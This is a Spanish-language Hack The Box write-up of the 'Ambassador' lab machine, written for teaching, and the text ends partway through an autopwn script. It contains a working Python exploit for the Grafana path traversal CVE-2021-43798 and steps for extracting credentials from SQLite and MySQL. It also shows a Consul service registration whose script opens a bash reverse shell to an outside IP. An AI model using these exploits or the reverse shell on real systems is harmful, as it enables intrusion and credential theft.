---
title: Hackthebox Writeup Ambassador
date: 2022-11-23 15:40:18 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, cve-2021-43798, Directory Path Traversal, Leakage Information, Git, MySQL, SQLite, Pyton Scripting]

img_path: /assets/img/htb/writeups/ambassador
---

# Overview

1. **Directory Path Traversal** by grafana plugin url (CVE-2021-43798)
2. SQLite and MySQL **Database enumeration** (Foothold)
3. **Remote Code Execution** by Consul Service Registration (Privilege Escalation)

![Logo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.183 |  01 Oct 2022 |   Medium   |   30   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.183
PING 10.10.11.183 (10.10.11.183) 56(84) bytes of data.
64 bytes from 10.10.11.183: icmp_seq=1 ttl=63 time=106 ms
                                          \______________________ Linux Machine
--- 10.10.11.183 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 105.547/105.547/105.547/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Empezamos con la fase de reconocimiento haciendo un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir los puertos abiertos de la máquina:

```console
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.183
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 15:48 -05
Nmap scan report for 10.10.11.183
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
                \_________________ Secure Shell Protocol
80/tcp   open  http
                \_________________ Hypertext Transfer Protocol
3000/tcp open  ppp
                \_________________ Point-to-Point Protocol
3306/tcp open  mysql
                \_________________ MySQL database
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> --open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos **21(FTP)** - **22(SSH)** - **80(HTTP)**:

```console
❯ nmap -p22,80,3000,3306 -sCV -oN open_ports_TCP 10.10.11.183
Nmap scan report for ambassador.htb (10.10.11.183)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 23 Nov 2022 20:56:51 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 23 Nov 2022 20:56:18 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 23 Nov 2022 20:56:24 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 61
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: d. \x1Al\x0D\x08@c\x08\x03.F5e\x13m\x10\2
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=11/23%Time=637E88F0%P=x86_64-pc-linux-gnu%r(G
...
SF:T\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear
>
> -sCV (Fusión de parámetros -sC -sV)
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
>
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Omitimos el escaneo al puerto **22(SSH)** y **3306(MySQL)** ya que no tenemos ninguna credencial válida y la versión del servicio no es vulnerable. Por otro lado, tenemos los servicios web en los puertos **80(HTTP)** y **3000(PPP)**:

> Enumeración del puerto **80**

![SSH user leakage](ssh_user_leak.png){: shadow}

Debido a un **Leakage Information** conseguimos un posible usuario para conectarnos por SSH

> Enumeración del puerto **3000**

Del escaneo anterior con `nmap` no conseguimos información sobre las tecnologías del servicio, por ello usamos `whatweb` para enumerarlas:

```console
❯ whatweb 10.10.11.183:3000
http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

## Foothold

* * *

Observamos que existe una redirección a un panel de login, pero mas importante, vemos una tecnología llamada `Grafana[8.2.0]`. Así que de manera general usamos `searchsploit` (herramienta de la linea de comandos para buscar diferentes exploits de su base de datos _Exploit DB_):

```console
❯ searchsploit Grafana
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                               | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read           | multiple/webapps/50581.py
---------------------------------------------------------------------- ---------------------------------
```

Encontramos que una version posterior es vulnerable a un **Path Traversal**, para asegurarnos buscamos en internet vulnerabilidades con la respectiva versión:

> [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)

![CVE detail](CVE-2021-43798_detail.png){: .shadow}

Como validamos que es vulnerable, basandonos en el script original tenemos el siguiente exploit:

```python
"""
CVE-2021-43798
--------------
Description: Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0
"""

import argparse
import signal
import sys

from random import choice
from requests import Session, Request

# Ctrl + c
# (function)
def signal_handler(signum, frame):
	sys.exit('\n[!] User terminated.')

# (signal)
signal.signal(signal.SIGINT, signal_handler)


## Default plugins Grafana (https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
plugins = [ 
	"alertlist",
	"annolist",
	"barchart",
	"bargauge",
	"candlestick",
	"cloudwatch",
	"dashlist",
	"elasticsearch",
	"gauge",
	"geomap",
	"gettingstarted",
	"grafana-azure-monitor-datasource",
	"graph",
	"heatmap",
	"histogram",
	"influxdb",
	"jaeger",
	"logs",
	"loki",
	"mssql",
	"mysql",
	"news",
	"nodeGraph",
	"opentsdb",
	"piechart",
	"pluginlist",
	"postgres",
	"prometheus",
	"stackdriver",
	"stat",
	"state-timeline",
	"status-history",
	"table",
	"table-old",
	"tempo",
	"testdata",
	"text",
	"timeseries",
	"welcome",
	"zipkin"
]

## Functions
# make request to grafana
def make_request(args):
	try:
		with Session() as session:

			vulnerable_path = args.target + '/public/plugins/' + choice(plugins) + '/..'*10 + args.file
			
			request = Request('GET', vulnerable_path)

			prepare_req = session.prepare_request(request)
			prepare_req.url = vulnerable_path

			response = session.send(prepare_req)

			if 'Plugin not found' in response.text:
				sys.exit('\n[!] File not found')
			else:
				if response.status_code == 200:
					print('\n{}\n'.format(response.text))

	except Exception as error:
		sys.exit('\n[X] Error: %s' % error)


## Main flow
if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description="Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0",
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		CVE-2021-43798.py -t http://10.10.11.183:3000 -f /etc/passwd
		""")

	parser.add_argument('-t', '--target', required=True, help='Grafana host')
	parser.add_argument('-f', '--file', required=True, help='File name to read')

	args = parser.parse_args()

	make_request(args)
```

Ahora intentamos leer el archivo _/etc/passwd_ y lo conseguimos:

```shell
❯ python3 CVE-2021-43798.py -t 'http://10.10.11.183:3000' -f '/etc/passwd'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```
{: .nolineno}

> Aquí tienes un articulo que estudia a detalle la vulnerabilidad anterior: [https://j0vsec.com/post/cve-2021-43798/](https://j0vsec.com/post/cve-2021-43798/)
{: .prompt-info}

Ya que podemos leer archivos, nuestro siguiente paso es **buscar archivos interesantes sobre cualquier aplicación del sistema**. Y ya que nuestro objetivo fue `Grafana`, ahora podemos buscar archivos de configuración que contengan datos importantes:

> [Grafana Configuration](https://docs.huihoo.com/grafana/2.6/installation/configuration/index.html)

![grafana config doc](grafana_conf_info.png){: .shadow}

Obtenemos la ruta del archivo de configuración y lo logramos extraer:

```ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

...
```

Examinando el archivo encontramos en la sección de **Paths** lo siguiente:

```ini
...

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

...
```

Una ruta donde se almacenan archivos interesantes, solo nos faltaria un nombre, el cúal encontramos en la sección **Database**:

```ini
...

#################################### Database ####################################
[database]

...

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

...
```

Lo tenemos, ahora intentamos descargar el archivo `/var/lib/grafana/grafana.db`:

> Usando `curl`

```shell
❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../var/lib/grafana/grafana.db -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  644k  100  644k    0     0   807k      0 --:--:-- --:--:-- --:--:--  807k

❯ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 558, database pages 161, cookie 0x119, schema 4, UTF-8, version-valid-for 558
```
{: .nolineno}

Ahora usamos el comando `sqlite3` para enumerar la base de datos `grafana.db`:

> List tables

```console
❯ sqlite3 grafana.db
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token
```

> Enumerate table schema

```console
sqlite> .schema data_source 
CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);
CREATE INDEX `IDX_data_source_org_id` ON `data_source` (`org_id`);
CREATE UNIQUE INDEX `UQE_data_source_org_id_name` ON `data_source` (`org_id`,`name`);
CREATE UNIQUE INDEX `UQE_data_source_org_id_uid` ON `data_source` (`org_id`,`uid`);
CREATE INDEX `IDX_data_source_org_id_is_default` ON `data_source` (`org_id`,`is_default`);
```

> DataSource is a name given to the connection set up to a database from a server
{: .prompt-tip}

> Extract database credentials

```console
sqlite> .mode column
sqlite> .header on
sqlite> SELECT user, password, database FROM data_source;
user     password                    database
-------  --------------------------  --------
grafana  dontStandSoCloseToMe63221!  grafana
```

> Aquí puedes encontrar algunos comandos básicos de `SQLite`: [https://www.sqlitetutorial.net/sqlite-commands/](https://www.sqlitetutorial.net/sqlite-commands/)
{: .prompt-info}

Con estas credenciales nos conectamos a la base de datos que enumeramos anteriormente con `nmap`, y extraemos las credenciales del usuario `developer`:

```console
❯ mysql -h '10.10.11.183' -u 'grafana' -p grafana
Enter password:       
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
                                              
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
                                                                                             
MySQL [grafana]> show schemas;                                                               
+--------------------+
| Database           |
+--------------------+            
| grafana            |    
| information_schema |    
| mysql              |    
| performance_schema |    
| sys                |    
| whackywidget       |  
+--------------------+
6 rows in set (0.112 sec)                                                                                                                             
                                                                                             
MySQL [grafana]> use whackywidget;                                                           
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
                                                                                             
Database changed        
MySQL [whackywidget]> show tables;
+------------------------+                                                                                                                                                                 
| Tables_in_whackywidget |                  
+------------------------+                  
| users                  |                  
+------------------------+               
1 row in set (0.105 sec)
                                              
MySQL [whackywidget]> SELECT * FROM users;                                                    
+-----------+------------------------------------------+
| user      | pass                                     |         
+-----------+------------------------------------------+      
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+

MySQL [whackywidget]> SELECT user, FROM_BASE64(pass) FROM users\G
*************************** 1. row ***************************
             user: developer
FROM_BASE64(pass): anEnglishManInNewYork027468
```

Ahora recordamos el mensaje de antes sobre que podemos conectarnos por **SSH** como el usuario `developer` y conseguimos entrar al sistema:

```console
❯ ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ED25519) to the list of known hosts.
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 23 Nov 2022 11:02:22 PM UTC

  System load:  0.02              Processes:             229
  Usage of /:   81.5% of 5.07GB   Users logged in:       0
  Memory usage: 55%               IPv4 address for eth0: 10.10.11.183
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Nov 23 20:53:34 2022 from 10.10.14.6
developer@ambassador:~$ find / -name user.txt -exec ls -l {} + 2>/dev/null
-rw-r----- 1 root developer 33 Nov 23 17:05 /home/developer/user.txt
```

## Privilege Escalation

* * *

Después de una enumeración básica del sistema encontramos varios puertos abiertos de manera local:

```console
developer@ambassador:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -
```

Usamos un poco de scripting en `bash` para comunicarnos con cada puerto:

```console
developer@ambassador:~$ for i in $(netstat -tulnp | grep 127.0.0.1 | awk '{print $4}' | awk -F':' '{print $2}'); do echo -e "$i:\n"; curl http://localhost:$i; done
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
8600:

curl: (52) Empty reply from server
33060:

curl: (1) Received HTTP/0.9 when not allowed

8300:

curl: (56) Recv failure: Connection reset by peer
8301:

curl: (52) Empty reply from server
8302:

curl: (52) Empty reply from server
8500:

Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.8301:

curl: (52) Empty reply from server
8302:

curl: (52) Empty reply from server
8600:

curl: (52) Empty reply from server
```

Solo conseguimos respuesta del puerto **8500** y menciona algo de `Consul`, buscando en internet encontramos lo siguiente:

> [Consul service](https://www.consul.io/)

![Consul meaning](consul_mean.png){: .shadow}

Ya que sabemos que `Consul` corre por detrás y no es la versión mas reciente, para informarnos más buscamos información en su **Documentación**:

> [Register Service](https://developer.hashicorp.com/consul/api-docs/agent/service#register-service) with Consul API

![Register service](register_service.png){: .shadow}

Observamos que en la sección `Args` podemos ejecutar un archivo en intervalos de tiempo especificados. Pero que es ese archivo en `.json`?:

> [Service Configuration](https://developer.hashicorp.com/consul/docs/discovery/services#register-services-with-service-definitions)

![Service configuration](service_configuration.png){: .shadow}

Ahora creamos nuestros archivos:

> _reverse.sh_

```shell
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.155/1234 0>&1
```

> _payload.json_

```json
{
  "ID": "marss_service",
  "Name": "rce",
  "Tags": ["primary", "v1"],
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "DeregisterCriticalServiceAfter": "90m",
    "Args": ["/tmp/.10.10.14.155/reverse.sh"],
    "Interval": "10s",
    "Timeout": "86400s"
  }
}
```

Ejecutamos el comando para subir nuestro servicio y nos aparece lo siguiente:

```console
developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT --data @payload.json \
  http://localhost:8500/v1/agent/service/register?replace-existing-checks=true
Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "redis"
```

Explorando más la documentación tenemos lo siguiente:

> [Consul Authentication](https://developer.hashicorp.com/consul/api-docs/api-structure)

![Consul auth](consul_token.png){: .shadow}

Entonces lo que nos falta es el `token` para poder realizar peticiones y así ejecutar nuestro servicio. Por ello, enumerando el sistema encontramos un repositorio `git` en el directorio `my-app` y revisando los cambios del último log encontramos el token:

```console
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
developer@ambassador:/opt/my-app$ git show
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Ahora ejecutamos nuestro servicio, esperemos el **intervalo** establecido y se ejecutara nuestra **Shell inversa**:

```console
developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT --data @payload.json \
  -H 'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5' \
  http://localhost:8500/v1/agent/service/register?replace-existing-checks=true
developer@ambassador:/tmp/.10.10.14.155$ chmod +x reverse.sh 
developer@ambassador:/tmp/.10.10.14.155$ 

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.183.
Ncat: Connection from 10.10.11.183:35370.
bash: cannot set terminal process group (29649): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# whoami
whoami
root
root@ambassador:/# find / -name root.txt -exec ls -l {} \;
find / -name root.txt -exec ls -l {} \;
-rw-r----- 1 root root 33 Nov 23 17:05 /root/root.txt
```

Luego de esto es importante **desactivar el servicio**, lo hacemos con el siguiente comando:

```console
developer@ambassador:/tmp/.10.10.14.155$ curl -X PUT -H 'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5' \
  http://localhost:8500/v1/agent/service/deregister/marss_service
```

## Autopwn

* * *

Para seguir mejorando el scripting hice un autopwn en `python` para automatizar todo el proceso:

```python
#!/usr/bin/env python3

"""
Autopwn Assambador HTB
----------------------
Author: Marss
Date: 21 Nov, 2022
"""

import argparse
import sqlite3

from base64 import b64decode
from json import dumps
from mysql import connector
from paramiko import AutoAddPolicy, SSHClient
from pwn import *
from random import choice
from re import findall
from requests import Request, Session
from signal import signal, SIGINT
from sys import exit

## Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)


## Global variables
# grafana plugins
plugins = [ 
	"alertlist",
	"annolist",
	"barchart",
	"bargauge",
	"candlestick",
	"cloudwatch",
	"dashlist",
	"elasticsearch",
	"gauge",
	"geomap",
	"gettingstarted",
	"grafana-azure-monitor-datasource",
	"graph",
	"heatmap",
	"histogram",
	"influxdb",
	"jaeger",
	"logs",
	"loki",
	"mssql",
	"mysql",
	"news",
	"nodeGraph",
	"opentsdb",
	"piechart",
	"pluginlist",
	"postgres",
	"prometheus",
	"stackdriver",
	"stat",
	"state-timeline",
	"status-history",
	"table",
	"table-old",
	"tempo",
	"testdata",
	"text",
	"timeseries",
	"welcome",
	"zipkin"
]

## Main class
class Exploit:
	def __init__(self, args):
		self.args = args

		self.target_host = {
			'ip_address' : '10.10.11.183',
			'grafana_service' : 'http://10.10.11.183:3000'
		}

		self.target_files = {
			'grafana_conf' : '/etc/grafana/grafana.ini',
			'grafana_db' : None
		}

		self.target_credentials = {
			'mysql' : {
				'user' : None,
				'pass' : None
			},
			'ssh' : {
				'user' : None,
				'pass' : None
			},
			'consul' : { 'token' : None }
		}

		self.json_file = 'payload.json'
		self.shell_file = 'shell.sh'

	def run(self):
		"""
		Exploit process:
		----------------
		(1) Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)
			* Database path into Grafana config file
		
		(2) SQLite enumeration in Grafana database file
			* Mysql credentials

		(3) Mysql enumeration
			* SSH credentials

		(4) Vulnerable path in Consul service registration (Remote Code Execution)
			* [Requirements] 
				- Consul token (Leakage Information in git repository)
		"""
		with log.progress('Starting Attack') as progress:

			progress.status('Grafana plugin url [CVE-2021-43798] (Directory Path Traversal)'); time.sleep(3)
			self.extract_file(file=self.target_files['grafana_conf'])

			progress.status('Searching grafana.db path in config file'); time.sleep(3)
			self.get_database_path()
			self.extract_file(file=self.target_files['grafana_db'])
			
			progress.status('SQLite enumeration in Grafana database file'); time.sleep(3)
			self.get_mysql_cred()
			
			progress.status('Login to Mysql with credentials'); time.sleep(2)
			self.extract_ssh_cred()

			progress.status('Prepare .json and .sh file'); time.sleep(3)
			self.prepare_files()

			progress.status('Creating Consul service to receive the shell'); time.sleep(3)
			self.get_shell()

	def extract_file(self, file):
		try:
			with Session() as session:
				vulnerable_path = self.target_host['grafana_service'] \
					+ '/public/plugins/' \
					+ choice(plugins) \
					+ '/..'*8 \
					+ file

				request = Request(method='GET', url=vulnerable_path)

